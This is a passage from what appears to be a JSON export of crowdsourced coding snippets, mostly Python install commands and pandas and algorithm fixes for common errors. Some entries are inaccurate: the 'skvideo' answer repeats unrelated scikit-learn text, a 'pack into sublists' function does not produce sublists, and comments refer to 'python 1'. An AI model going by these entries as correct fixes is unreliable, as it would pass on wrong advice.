    "id": 136,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'requests toolbelt'",
    "description": "pip install requests-toolbelt\n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 137,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'rest auth'",
    "description": "pip install django-rest-auth \n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 138,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'rospkg'",
    "description": "# `python-catkin-tools` is needed for catkin tool # `python3-dev` and `python3-catkin-pkg-modules` is needed to build cv_bridge # `python3-numpy` and `python3-yaml` is cv_bridge dependencies # `ros-melodic-cv-bridge` is needed to install a lot of cv_bridge deps. Probaply you already have it installed. sudo apt-get install python-catkin-tools python3-dev python3-catkin-pkg-modules python3-numpy python3-yaml ros-melodic-cv-bridge  # Create catkin workspace mkdir catkin_workspace cd catkin_workspace catkin init # Instruct catkin to set cmake variables catkin config -DPYTHON_EXECUTABLE=/usr/bin/python3 -DPYTHON_INCLUDE_DIR=/usr/include/python3.6m -DPYTHON_LIBRARY=/usr/lib/aarch64-linux-gnu/libpython3.6m.so # Instruct catkin to install built packages into install place. It is $CATKIN_WORKSPACE/install folder catkin config --install # Clone cv_bridge src git clone https://github.com/ros-perception/vision_opencv.git src/vision_opencv # Find version of cv_bridge in your repository apt-cache show ros-kinetic-cv-bridge | grep Version        Version: 1.13.0-0xenial-20180416-143935-0800 # Checkout right version in git repo. In our case it is 1.12.8 cd src/vision_opencv/ git checkout 1.13.0 cd ../../ # Build catkin build cv_bridge # Extend environment with new package source install/setup.bash --extend       ############ TEST ############ $ python3 Python 3.5.2 (default, Nov 23 2017, 16:37:01) [GCC 5.4.0 20160609] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from cv_bridge.boost.cv_bridge_boost import getCvType >>>\n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 139,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'scipy'",
    "description": ">> 1st sudo apt-get install python-scipy >> Then run: pip install scipy \n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 140,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'seaborn'",
    "description": "#python 1 pip install seaborn #python 3 pip install seaborn\npip install seaborn\npip3 install seaborn\npython -m pip install seaborn\n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 141,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'sklearn'",
    "description": "pip install scikit-learn\n#for python 1 pip install -U scikit-learn scipy matplotlib #for python 3 pip3 install -U scikit-learn scipy matplotlib\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 142,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'sklearn.cross validation'",
    "description": "Substitute cross_validation to model_selection\n#Substitute cross_validation to model_selection from sklearn.model_selection import train_test_split\n#train_test_split is now in model_selection. Just type:  from sklearn.model_selection import train_test_split #it should work\nImportError: No module named sklearn.cross_validation\nfrom sklearn.model_selection import train_test_split\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 143,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'skvideo'",
    "description": "#for python 1 pip install -U scikit-learn scipy matplotlib #for python 3 pip3 install -U scikit-learn scipy matplotlib\n$ sudo pip install scikit-video\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 144,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'slugify'",
    "description": "# shell/bash pip install python-slugify # or  pip3 install python-slugify  # python from slugify import slugify\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 145,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'tkinter'",
    "description": "sudo apt-get install python3-tk \nsudo apt-get install python-tk \ntry:     # for Python2     # sudo apt-get install python-tk      from Tkinter import *   ## notice capitalized T in Tkinter  except ImportError:     # for Python3     # sudo apt-get install python3-tk      from tkinter import *   ## notice lowercase 't' in tkinter here \n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 146,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'transforms3d'",
    "description": "pip install transforms3d\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 147,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'xgboost'",
    "description": "conda install -c conda-forge xgboost\npip install xgboost\npip install xgboost \n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 148,
    "keyword": null,
    "link": null,
    "title": " Module 'cv2' has no 'imread' member",
    "description": "(1) open palette on VS Code (use specifies command): CTRL + Shift + P (2) then select \"Preferences: Open Settings (JSON)\" option in the palette dropdown (3) then add the following line in the opened \"settings.json\" file \"python.linting.pylintArgs\": [\"--generate-members\"]\nfrom cv2 import cv2\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 149,
    "keyword": null,
    "link": null,
    "title": " Module 'torch' has no 'stack' memberpylint(no-member)",
    "description": "# On VScode: CTRL + Shift + P # Choose \"Preferences: Open Settings (JSON)\" # Add this line into JSON file:  \"python.linting.pylintArgs\": [ \"--generated-members=numpy.* ,torch.*\" ] \n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 150,
    "keyword": null,
    "link": null,
    "title": " Move all the negative elements to one side of the array",
    "description": "def rearrange(arr):     low = 0     high = 0     while high<len(arr):         if (arr[high] < 0):             arr[high], arr[low] = arr[low] , arr[high]             low += 1         high += 1      print(arr)                # Driver code arr = [-1, 2, -3, 4, 5, 6, -7, 8, 9] rearrange(arr) #Output -> [-1, -3, -7, 4, 5, 6, 2, 8, 9]\n",
    "reg_date": "2021-10-12T11:27:41.000Z"
  },
  {
    "id": 151,
    "keyword": null,
    "link": null,
    "title": " NameError: name 'TimeDistributed' is not defined",
    "description": "from keras.layers.wrappers import TimeDistributed\n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 152,
    "keyword": null,
    "link": null,
    "title": " NameError: name 'after this request' is not defined",
    "description": "from flask import request\n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 153,
    "keyword": null,
    "link": null,
    "title": " NameError: name 'os' is not defined django",
    "description": "import os\n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 154,
    "keyword": null,
    "link": null,
    "title": " NameError: name 'request' is not defined",
    "description": "from flask import request\nfrom flask import Flask, request\n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 155,
    "keyword": null,
    "link": null,
    "title": " Need Clang >= 7 to compile Filament from source",
    "description": "sudo apt-get install -y clang-7  Follow the instruction to install the requirements of the open3d library here  http://www.open3d.org/docs/release/arm.html#install-dependencies \n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 156,
    "keyword": null,
    "link": null,
    "title": " New Year's Eve",
    "description": "Happy New Year my grepper friends!!!\nCheers to a New Year Grepper Community!!  \nif is \"12/31/2020\":   print(\"HAPPY NEW YEARS EVE!\")\nWOOOOOOO! Cheers to a New Year!!\nDon't miss clicking on the ICON right of this screen! Wohuuuuuu!\nHappy New Year! Goodbye 2020!\nOMG ! CANT WAIT FOR 2021!!!\nYo coders, happy 2021... Let's make it fantastic !\nSystem.out.print(\"Happy new  year\");\nGood Bye 2020,Hey Wassup? 2021\n",
    "reg_date": "2021-10-12T11:27:42.000Z"
  },
  {
    "id": 157,
    "keyword": null,
    "link": null,
    "title": " No matching distribution found for tensorflow==2.2.0",
    "description": "Upgrade pip python3 -m pip install --upgrade pip\nthis error will show only on python 3.9 if you use python 3.8 or before and after python 3.5 or something you wont get this error\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 158,
    "keyword": null,
    "link": null,
    "title": " No module named 'arabic reshaper'",
    "description": "pip install arabic-reshaper\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 159,
    "keyword": null,
    "link": null,
    "title": " No module named 'bidi'",
    "description": "pip install python-bidi\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 160,
    "keyword": null,
    "link": null,
    "title": " No module named 'bootstrap4' django",
    "description": "python -m pip install bootstrap4 \n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 161,
    "keyword": null,
    "link": null,
    "title": " No module named 'libtorrent'",
    "description": "   !python -m pip install --upgrade pip setuptools wheel    !python -m pip install lbry-libtorrent \n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 162,
    "keyword": null,
    "link": null,
    "title": " No module named 'matplotlib'",
    "description": "pip install matplotlib\npip install matplotlib \n# Run CMD, enter:  pip3 install matplotlib  # Open PyCharm and run an empty file with: import pip pip.main([\"install\",\"matplotlib\"]) \n%matplotlib inline import matplotlib.pyplot as plt \n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 163,
    "keyword": null,
    "link": null,
    "title": " No module named 'rest framework'",
    "description": "pip3 install djangorestframework\npip install djangorestframework\npip install djangorestframework-jwt\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 164,
    "keyword": null,
    "link": null,
    "title": " No module named 'rest framework simplejwt'",
    "description": "pip install djangorestframework-simplejwt\npip install djangorestframework-jwt\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 165,
    "keyword": null,
    "link": null,
    "title": " No module named 'sklearn.cross validation'",
    "description": "Substitute cross_validation to model_selection\n#Substitute cross_validation to model_selection from sklearn.model_selection import train_test_split\n#train_test_split is now in model_selection. Just type:  from sklearn.model_selection import train_test_split #it should work\nImportError: No module named sklearn.cross_validation\nfrom sklearn.model_selection import train_test_split\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 166,
    "keyword": null,
    "link": null,
    "title": " No module named 'sklearn.utils.linear assignment",
    "description": "pip install scikit-learn==0.22.2\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 167,
    "keyword": null,
    "link": null,
    "title": " No module named 'sqlalchemy' mac",
    "description": "pip install Flask-SQLAlchemy\n",
    "reg_date": "2021-10-12T11:27:43.000Z"
  },
  {
    "id": 168,
    "keyword": null,
    "link": null,
    "title": " No module named 'xgboost'",
    "description": "conda install -c conda-forge xgboost\npip install xgboost\npip install xgboost \n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 169,
    "keyword": null,
    "link": null,
    "title": " OSError: [E050] Can't find model 'de'. It doesn't seem to be a shortcut link, a Python package or a valid path to a data directory.",
    "description": "python -m spacy download en \nimport en_core_web_sm nlp = en_core_web_sm.load()\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 170,
    "keyword": null,
    "link": null,
    "title": " OSError: [E050] Can't find model 'en'. It doesn't seem to be a shortcut link, a Python package or a valid path to a data directory.",
    "description": "python -m spacy download en \npython3 -m spacy download en_core_web_sm pip3 install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \nimport en_core_web_sm nlp = en_core_web_sm.load()\npip3 install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 171,
    "keyword": null,
    "link": null,
    "title": " PIL discord",
    "description": "await channel.send(file=discord.File('my_image.png'))\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 172,
    "keyword": null,
    "link": null,
    "title": " Pack consecutive duplicates of list elements into sublists python",
    "description": "import itertools  def pack_consecutive_duplicates(_list: list):     preprocessed_list = []     # x groups the duplicates into a tuple ()     # x[0] is the duplicate element     # x[1] is a grouper iterable that conatins all the duplicate elements     for x in itertools.groupby(_list):         amount = [*x[1]].count(x[0])         if amount > 1:             for k in range(0, amount):                 preprocessed_list.append(x[0])         else:             preprocessed_list.append((x[0]))      return preprocessed_list\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 173,
    "keyword": null,
    "link": null,
    "title": " PackagesNotFoundError: The following packages are not available from current channels: - python==3.6",
    "description": "conda config --append channels conda-forge\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 174,
    "keyword": null,
    "link": null,
    "title": " ParserError: Error tokenizing data. C error: Expected 1 fields in line 87, saw 2",
    "description": "data = pd.read_csv('file1.csv', error_bad_lines=False)\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 175,
    "keyword": null,
    "link": null,
    "title": " Presskeys in python",
    "description": "# in command prompt, type \"pip install pynput\" to install pynput. from pynput.keyboard import Key, Controller  keyboard = Controller() key = \"a\"  keyboard.press(key) keyboard.release(key)\nimport pyautogui  # Holds down the alt key pyautogui.keyDown(\"alt\")  # Presses the tab key once pyautogui.press(\"tab\")  # Lets go of the alt key pyautogui.keyUp(\"alt\")\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 176,
    "keyword": null,
    "link": null,
    "title": " Print Table Using While Loop In Python",
    "description": "number = int(input(\"Enter A Number : \"))  num = 1 while num <= 10:     total = num * number     print(total)     num = num +1\na=int(input(\"enter table number\")) b=int(input(\"enter the number to which table is to printed\")) i=1 while i<=b:     print(a,\"x\",i,\"=\",a*i)     i=i+1 \n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 177,
    "keyword": null,
    "link": null,
    "title": " Pthon hello world",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:27:44.000Z"
  },
  {
    "id": 178,
    "keyword": null,
    "link": null,
    "title": " Pygame add soundtrack / music",
    "description": "import pygame file = 'some.mp3' pygame.init() pygame.mixer.init() pygame.mixer.music.load(file) pygame.mixer.music.play(-1) # If the loops is -1 then the music will repeat indefinitely. \n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 179,
    "keyword": null,
    "link": null,
    "title": " Pykkar python",
    "description": "from pykkar import * #Imports the pykkar package create_world(\"\"\" ######## #  >   # #      # #      # #      # #      # ######## \"\"\") # <-- Creates a world for Pykkar step() #Steps one step forward right() #Turns 90 degrees to right put() #Puts a cone on the next square (up to 9 cones on 1 square) push() #Pushes the box or a cone on the next square forward by 1 square paint() #Paints the square Pykkar is standing on darker is_wall() #returns true or false - is the wall in the way? is_cone() #returns ture or false - is a cone in the way? is_box() #returns true or false - is a box on the way? is_painted() #returns true or false - is the square under Pykkar painted? get_dirextion() #returns the direction to which pykkar is facing\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 180,
    "keyword": null,
    "link": null,
    "title": " Python.h: No such file or directory",
    "description": "For apt (Ubuntu, Debian...):  sudo apt-get install python-dev   # for python2.x installs sudo apt-get install python3-dev  # for python3.x installs For yum (CentOS, RHEL...):  sudo yum install python-devel   # for python2.x installs sudo yum install python3-devel   # for python3.x installs For dnf (Fedora...):  sudo dnf install python2-devel  # for python2.x installs sudo dnf install python3-devel  # for python3.x installs For zypper (openSUSE...):  sudo zypper in python-devel   # for python2.x installs sudo zypper in python3-devel  # for python3.x installs For apk (Alpine...):  # This is a departure from the normal Alpine naming # scheme, which uses py2- and py3- prefixes sudo apk add python2-dev  # for python2.x installs sudo apk add python3-dev  # for python3.x installs For apt-cyg (Cygwin...):  apt-cyg install python-devel   # for python2.x installs apt-cyg install python3-devel  # for python3.x installs\nsudo apt-get install python-dev   # for python2.x installs sudo apt-get install python3-dev  # for python3.x installs\nfatal error: Python.h: No such file or directory\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 181,
    "keyword": null,
    "link": null,
    "title": " Python IRR calculation",
    "description": "irr1 = np.irr(project1_cf[\"cf\"]) irr2 = np.irr(project2_cf[\"cf\"]) irr_df = pd.DataFrame({\"Name\":[\"Project1\", \"Project2\"],                       \"IRR\":[irr1, irr2]}) print(irr_df)                   \n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 182,
    "keyword": null,
    "link": null,
    "title": " Python can't subtract offset-naive and offset-aware datetimes",
    "description": "import dateutil, datetime, pytz LastDate = dateutil.parser.parse('2020-06-06 00:00:00+00:00') now = datetime.datetime.now() # Remove the TimeZone extension. if (now - LastDate.replace(tzinfo=None) ).days >1:     print(\"This works\") # OR, make current datetime aware of the timezone now = pytz.utc.localize(now) if (now - LastDate ).days >1:     print(\"This works too\")\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 183,
    "keyword": null,
    "link": null,
    "title": " Python change screen brightness",
    "description": "pip install screen-brightness-control\nimport screen_brightness_control as screen sent_the_brightness = screen.set_brightness(10) get = screen.get_brightness() print(get)\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 184,
    "keyword": null,
    "link": null,
    "title": " Python function remove all whitespace from all character columns in dataframe",
    "description": "df.columns = df.columns.str.replace(' ', '') \n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 185,
    "keyword": null,
    "link": null,
    "title": " Python magickmock constraint errors",
    "description": "def test_check_unique_constraint(log):     mock_field = mock.MagicMock()     mock_field.descriptor = {'primaryKey': True}     mock_field.constraints['unique'] = True     cells1 = [         goodtables.cells.create_cell('name', 'value', mock_field, row_number=1, column_number=1),         goodtables.cells.create_cell('value', '50', mock_field, row_number=1, column_number=2),     ]     cells2 = [         goodtables.cells.create_cell('name', 'value', mock_field, row_number=2, column_number=1),         goodtables.cells.create_cell('value', '100', mock_field, row_number=2, column_number=2),     ]     duplicate_row = UniqueConstraint()     errors = duplicate_row.check_row(cells1)     errors += duplicate_row.check_row(cells2)      assert log(errors) == [         (2, 1, 'unique-constraint'),     ] \n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 186,
    "keyword": null,
    "link": null,
    "title": " Python program to remove duplicate characters of a given string.",
    "description": ">>> foo = 'mppmt' >>> ''.join(sorted(set(foo), key=foo.index)) 'mpt'\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 187,
    "keyword": null,
    "link": null,
    "title": " Python program to write a list to a file",
    "description": "# define list of places places = ['Berlin', 'Cape Town', 'Sydney', 'Moscow']  with open('listfile.txt', 'w') as filehandle:     for listitem in places:         filehandle.write('%s\\n' % listitem)\ncolor = ['Red', 'Green', 'White', 'Black', 'Pink', 'Yellow'] with open('file1.txt','w+') as f: \tfor i in color: \t\tf.write('%s\\n'%i)  with open('file1.txt') as f: \tprint(f.read()) ############### list1=[] with open('file1.txt','r+') as f: \tlines = f.readlines() \tfor line in  lines: \t\titem = line[:-1] \t\tlist1.append(item) \tprint(list1) #############  with open('file1.txt','r') as f: \tlines=f.read() \tlistli=lines.split('\\n') \tprint(listli) \t# listli=lines.strip() \t# print(listli) \nimport json a = [1,2,3] with open('test.txt', 'w') as f:     f.write(json.dumps(a))  #Now read the file back into a Python list object with open('test.txt', 'r') as f:     a = json.loads(f.read())\n",
    "reg_date": "2021-10-12T11:27:45.000Z"
  },
  {
    "id": 188,
    "keyword": null,
    "link": null,
    "title": " Python random text generator",
    "description": "import random, string  ran = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) print(ran) \nimport string import random  length=5 #python2 randomstr = ''.join(random.sample(string.ascii_letters+string.digits,length))   #python3 randomstr = ''.join(random.choices(string.ascii_letters+string.digits,k=length))                                    \n# -random letter generator- import string var1 = string.ascii_letters  import random var2 = random.choice(string.ascii_letters) print(var2)\n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 189,
    "keyword": null,
    "link": null,
    "title": " Python remove duplicates from list",
    "description": "mylist = [\"a\", \"b\", \"b\", \"c\", \"a\"] mylist = sorted(set(mylist)) print(mylist)\n   mylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))    print(mylist) \n# remove duplicate from given_list using list comprehension res = [] [res.append(x) for x in given_list if x not in res]\nbad_list = [\"hi\", 1, 2, 2, 3, 5, \"hi\", \"hi\"] good_list = list(set(bad_list))\n''' we can convert the list to set and then back to list''' a=[1,1,2,3,4,5,6,6,7] '''b=(list(set(a))) # will have only unique elemenets'''\n# get unique items in list aa with order maintained (python 3.7 and up) list(dict.fromkeys(aa)) \n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 190,
    "keyword": null,
    "link": null,
    "title": " Python sort dataframe by list",
    "description": "# sorts the dataframe so resulting order of ColumnName matches order in list df = df.set_index(ColumnName).reindex(list_to_sort_by).reset_index()\n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 191,
    "keyword": null,
    "link": null,
    "title": " ROLL D6",
    "description": "import random  dice = random.randint(1, 6)\n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 192,
    "keyword": null,
    "link": null,
    "title": " R hello world",
    "description": "print(\"Hello World\")\n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 193,
    "keyword": null,
    "link": null,
    "title": " Reading the data",
    "description": "df = pd.read_csv(\"FuelConsumption.csv\")  # take a look at the dataset df.head()\n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 194,
    "keyword": null,
    "link": null,
    "title": " Reindexing Dataframe in Pandas",
    "description": ">>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 195,
    "keyword": null,
    "link": null,
    "title": " Remove the Unnamed column in pandas",
    "description": "df = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 196,
    "keyword": null,
    "link": null,
    "title": " Renaming row value in pandas",
    "description": "# if the row value in column 'is_blue' is 1  # Change the row value to 'Yes'  # otherwise change it to 'No' df['is_blue'] = df['is_blue'].apply(lambda x: 'Yes' if (x == 1) else 'No')    # You can also use mapping to accomplish the same result # Warning: Mapping only works once on the same column creates NaN's otherwise df['is_blue'] = df['is_blue'].map({0: 'No', 1: 'Yes'})  \n",
    "reg_date": "2021-10-12T11:27:46.000Z"
  },
  {
    "id": 197,
    "keyword": null,
    "link": null,
    "title": " Roman numerals to int python",
    "description": "class py_solution:     def roman_to_int(self, s):         rom_val = {'I': 1, 'V': 5, 'X': 10, 'L': 50, 'C': 100, 'D': 500, 'M': 1000}         int_val = 0         for i in range(len(s)):             if i > 0 and rom_val[s[i]] > rom_val[s[i - 1]]:                 int_val += rom_val[s[i]] - 2 * rom_val[s[i - 1]]             else:                 int_val += rom_val[s[i]]         return int_val  print(py_solution().roman_to_int('MMMCMLXXXVI')) print(py_solution().roman_to_int('MMMM')) print(py_solution().roman_to_int('C'))  \n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 198,
    "keyword": null,
    "link": null,
    "title": " Running setup.py bdist wheel for opencv-python: still running...",
    "description": "pip3 install --upgrade setuptools pip  pip3 install opencv-python\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 199,
    "keyword": null,
    "link": null,
    "title": " RuntimeError: Attempting to deserialize object on a CUDA device but torch.cuda.is available()",
    "description": "model = torch.load('mymodel.pt',map_location=torch.device('cpu'))\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 200,
    "keyword": null,
    "link": null,
    "title": " RuntimeError: error in LoadLibraryA",
    "description": "Try this workground: run the following code after import torch (should be fixed in 1.5):  import ctypes ctypes.cdll.LoadLibrary('caffe2_nvrtc.dll')\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 201,
    "keyword": null,
    "link": null,
    "title": " SQL Query to Join Two Tables Based Off Closest Timestamp",
    "description": "SELECT case.id, case.resolution, case.timestamp, class.value   FROM closed_cases AS case   LEFT JOIN (select c.*,                      (select min(timestamp)                      from classifications c1                       where c1.timestamp > c.timestamp) timeend              from classifications c) AS class    ON case.timestamp >= class.timestamp and       (case.timestamp < class.timeend or class.timeend IS NULL)   WHERE case.timestamp BETWEEN $1 AND $2; \n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 202,
    "keyword": null,
    "link": null,
    "title": " SSL handshake failed: localhost:27017",
    "description": "#run this in your terminal  sudo /Applications/Python\\ 3.7/Install\\ Certificates.command  #If you use other python version, only change versi&oacute;n number (In my case, i have Python 3.7)  \n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 203,
    "keyword": null,
    "link": null,
    "title": " Set up and run a two-sample independent t-test",
    "description": "# Import the libraries import numpy as np from scipy import stats np.random.seed(42)  # Generate the random variables with the specified mean, std, and sample size rvs1 = stats.norm.rvs(loc=5, scale=10,size=500) rvs2 = stats.norm.rvs(loc=5, scale=20, size=500)  # Calculate the t statistic for these two sample populations stats.ttest_ind(rvs1, rvs2)\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 204,
    "keyword": null,
    "link": null,
    "title": " Sieve of Eratosthenes python",
    "description": "#The other code in Grepper(By Disgusted Donkey) is in python2 #this one is python3  def SieveOfEratosthenes(n):             # Create a boolean array \"prime[0..n]\" and initialize      # all entries it as true. A value in prime[i] will      # finally be false if i is Not a prime, else true.      prime = [True for i in range(n + 1)]      p = 2     while (p * p <= n):                     # If prime[p] is not changed, then it is a prime          if (prime[p] == True):                             # Update all multiples of p              for i in range(p * 2, n + 1, p):                  prime[i] = False         p += 1     prime[0]= False     prime[1]= False     # put all prime numbers in a list     r = []     for p in range(n + 1):          if prime[p]:              r.append(p)      #return the list             return r    # driver program  if __name__=='__main__':      n = 50     print (\"Following are the prime numbers smaller\")      print (\"than or equal to\", n)     print(SieveOfEratosthenes(n))\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 205,
    "keyword": null,
    "link": null,
    "title": " Slicing lexicographically pandas",
    "description": "Specifically, .loc[] allows you to select all rows with an index lexicographically using slice notation. This works only if the index is sorted (.sort_index()). \n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 206,
    "keyword": null,
    "link": null,
    "title": " Spacy en core web sm error",
    "description": "python -m spacy download en \npython3 -m spacy download en_core_web_sm pip3 install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \nimport en_core_web_sm nlp = en_core_web_sm.load()\n",
    "reg_date": "2021-10-12T11:27:47.000Z"
  },
  {
    "id": 207,
    "keyword": null,
    "link": null,
    "title": " Split string every nth character",
    "description": ">>> line = '1234567890' >>> n = 2 >>> [line[i:i+n] for i in range(0, len(line), n)] ['12', '34', '56', '78', '90'] \n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
    "id": 208,
    "keyword": null,
    "link": null,
    "title": " Square of numbers in non-decreasing order",
    "description": "\"\"\" Given an integer array sorted in non-decreasing order, return an array of the squares of each number sorted in non-decreasing order. \"\"\"   def sortedSquares(nums):     n = len(nums)     start, end = 0, n - 1     result = [0] * n     index = n - 1      while end > -1 and index > -1:         if abs(nums[start]) > abs(nums[end]):             result[index] = nums[start] ** 2             start += 1         else:             result[index] = nums[end] ** 2             end -= 1         index -= 1      return result   print(sortedSquares([-4, -3, -2, 0, 1, 2, 5, 10])) \n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
    "id": 209,
    "keyword": null,
    "link": null,
    "title": " T-Test Comparison of two means python",
    "description": "from scipy import stats ttest = stats.ttest_ind(mean_a, mean_b, equal_var = False) p_value = ttest[1] print('p_value: {:0.3f}'.format(p_value))  # H0: mean_a - mean_b = 0 # HA:  mean_a - mean_b != 0 # For one tail t-test divide the p-value by 2 # For p-value <= 0.05: Reject H0\n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
    "id": 210,
    "keyword": null,
    "link": null,
    "title": " The Zen of Python, by Tim Peters",
    "description": "Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! \n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
    "id": 211,
    "keyword": null,
    "link": null,
    "title": " The authorization mechanism you have provided is not supported. Please use AWS4-HMAC-SHA256",
    "description": "django  AWS_S3_REGION_NAME = \"eu-west-2\" # your region AWS_S3_SIGNATURE_VERSION = \"s3v4\"\n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
    "id": 212,
    "keyword": null,
    "link": null,
    "title": " The following packages have unmet dependencies: libnode72 : Conflicts: nodejs-legacy E: Broken packages",
    "description": "sudo apt --fix-broken install sudo apt-get update && sudo apt-get upgrade sudo dpkg --configure -a sudo apt-get install -f \n",
    "reg_date": "2021-10-12T11:27:48.000Z"
  },
  {
